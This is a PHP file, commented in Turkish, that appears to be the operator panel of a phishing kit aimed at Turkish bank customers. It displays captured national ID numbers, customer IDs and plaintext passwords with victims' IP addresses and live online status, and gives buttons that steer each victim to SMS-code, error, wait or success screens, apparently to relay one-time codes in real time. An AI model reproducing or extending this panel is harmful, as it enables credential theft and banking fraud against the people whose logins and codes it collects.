<?php
session_start();
require_once '../db.php';

// Oturum kontrolü
if (!isset($_SESSION['admin_logged_in']) || $_SESSION['admin_logged_in'] !== true) {
    exit();
}

$current_time = time();
$result = $conn->query("SELECT * FROM users ORDER BY id DESC");
$total_count = $result->num_rows;

echo "<!-- TOTAL_COUNT:" . $total_count . " -->";

if ($total_count > 0) {
    while($row = $result->fetch_assoc()) {
        $tarih = date('d.m.Y H:i:s', strtotime($row['created_at']));
        
        // Aktiflik kontrolü (son 5 saniye içinde sinyal verdiyse aktif)
        $is_online = ($current_time - $row['last_seen']) <= 5;
        
        if ($is_online) {
            $online_indicator = '<span class="inline-flex items-center bg-green-100 text-green-800 text-xs px-2 py-0.5 rounded-full"><span class="w-2 h-2 mr-1 bg-green-500 rounded-full animate-pulse"></span>Online</span>';
        } else {
            $online_indicator = '<span class="inline-flex items-center bg-gray-100 text-gray-800 text-xs px-2 py-0.5 rounded-full"><span class="w-2 h-2 mr-1 bg-gray-500 rounded-full"></span>Offline</span>';
        }

        $statusText = '';
        $statusClass = '';
        switch($row['status']) {
            case 'sms': $statusText = 'SMS Ekranı'; $statusClass = 'bg-blue-100 text-blue-800'; break;
            case 'hatali_sms': $statusText = 'Hatalı SMS'; $statusClass = 'bg-red-100 text-red-800'; break;
            case 'basarili': $statusText = 'Başarılı'; $statusClass = 'bg-green-100 text-green-800'; break;
            case 'giris_yapiliyor': $statusText = 'Giriş Yapıyor'; $statusClass = 'bg-yellow-100 text-yellow-800'; break;
            default: $statusText = 'Bekliyor'; $statusClass = 'bg-yellow-100 text-yellow-800'; break;
        }
        
        $ip_address = isset($row['ip_address']) ? htmlspecialchars($row['ip_address']) : '-';
        $tc_bireysel = !empty($row['tc_kimlik']) ? $row['tc_kimlik'] : $row['bireysel_id'];
        
        echo "<tr class='hover:bg-gray-50 transition-colors'>";
        echo "<td class='px-6 py-4 whitespace-nowrap text-sm text-gray-500'>#" . $row['id'] . "</td>";
        echo "<td class='px-6 py-4 whitespace-nowrap text-sm'>" . $online_indicator . "<div class='text-xs text-gray-400 mt-1'><i class='fas fa-network-wired mr-1'></i>" . $ip_address . "</div></td>";
        
        if ($row['giris_tipi'] == 'bireysel') {
            echo "<td class='px-6 py-4 whitespace-nowrap'><span class='px-2 inline-flex text-xs leading-5 font-semibold rounded-full bg-emerald-100 text-emerald-800'>Bireysel</span></td>";
        } else {
            echo "<td class='px-6 py-4 whitespace-nowrap'><span class='px-2 inline-flex text-xs leading-5 font-semibold rounded-full bg-orange-100 text-orange-800'>Kurumsal</span></td>";
        }
        
        echo "<td class='px-6 py-4 whitespace-nowrap text-sm font-bold text-red-600'>" . htmlspecialchars($tc_bireysel) . "</td>";
        echo "<td class='px-6 py-4 whitespace-nowrap text-sm font-bold text-red-600'>" . (!empty($row['kurumsal_id']) ? htmlspecialchars($row['kurumsal_id']) : '-') . "</td>";
        echo "<td class='px-6 py-4 whitespace-nowrap text-sm font-bold text-gray-900 bg-yellow-50'>" . htmlspecialchars($row['sifre']) . "</td>";
        echo "<td class='px-6 py-4 whitespace-nowrap'><span class='px-2 inline-flex text-xs leading-5 font-semibold rounded-full " . $statusClass . "'>" . $statusText . "</span></td>";
        echo "<td class='px-6 py-4 whitespace-nowrap text-xs text-gray-500'>" . $tarih . "</td>";
        
        // İşlem Butonları (Yönlendirme)
        echo "<td class='px-6 py-4 whitespace-nowrap text-sm font-medium'>
                <div class='flex flex-wrap gap-2'>
                    <!-- Yönlendirmeler -->
                    <a href='#' onclick='updateStatus(" . $row['id'] . ", \"sms\"); return false;' class='inline-flex items-center px-2 py-1 bg-blue-500 hover:bg-blue-600 text-white text-xs rounded transition-colors' title='SMS Ekranına Gönder'>
                        <i class='fas fa-sms mr-1'></i> SMS
                    </a>
                    <a href='#' onclick='updateStatus(" . $row['id'] . ", \"hatali_sms\"); return false;' class='inline-flex items-center px-2 py-1 bg-red-500 hover:bg-red-600 text-white text-xs rounded transition-colors' title='Hatalı SMS Uyarısı Ver'>
                        <i class='fas fa-exclamation-circle mr-1'></i> Hatalı
                    </a>
                    <a href='#' onclick='updateStatus(" . $row['id'] . ", \"bekle\"); return false;' class='inline-flex items-center px-2 py-1 bg-yellow-500 hover:bg-yellow-600 text-white text-xs rounded transition-colors' title='Bekleme Ekranına Gönder'>
                        <i class='fas fa-hourglass-half mr-1'></i> Bekle
                    </a>
                    <a href='#' onclick='updateStatus(" . $row['id'] . ", \"basarili\"); return false;' class='inline-flex items-center px-2 py-1 bg-green-500 hover:bg-green-600 text-white text-xs rounded transition-colors' title='Başarılı Ekranına Gönder'>
                        <i class='fas fa-check mr-1'></i> Başarılı
                    </a>
                    
                    <div class='w-full h-0'></div> <!-- Satır atlamak için -->
                    
                    <!-- Ban ve Sil -->
                    <a href='logs.php?ban_ip=" . urlencode($ip_address) . "' onclick='return confirm(\"Bu IP adresini banlamak istediğinize emin misiniz? IP: " . $ip_address . "\");' class='inline-flex items-center px-2 py-1 bg-gray-800 hover:bg-black text-white text-xs rounded transition-colors' title='IP Banla'>
                        <i class='fas fa-ban mr-1'></i> Banla
                    </a>
                    <a href='logs.php?delete=" . $row['id'] . "' onclick='return confirm(\"Silmek istediğinize emin misiniz?\");' class='inline-flex items-center px-2 py-1 bg-gray-500 hover:bg-gray-700 text-white text-xs rounded transition-colors' title='Kaydı Sil'>
                        <i class='fas fa-trash'></i>
                    </a>
                </div>
              </td>";
        echo "</tr>";
    }
} else {
    echo "<tr><td colspan='9' class='px-6 py-10 text-center text-gray-500'><div class='flex flex-col items-center'><i class='fas fa-inbox text-4xl mb-3 text-gray-300'></i><p>Henüz hiçbir kayıt bulunmuyor.</p></div></td></tr>";
}
?>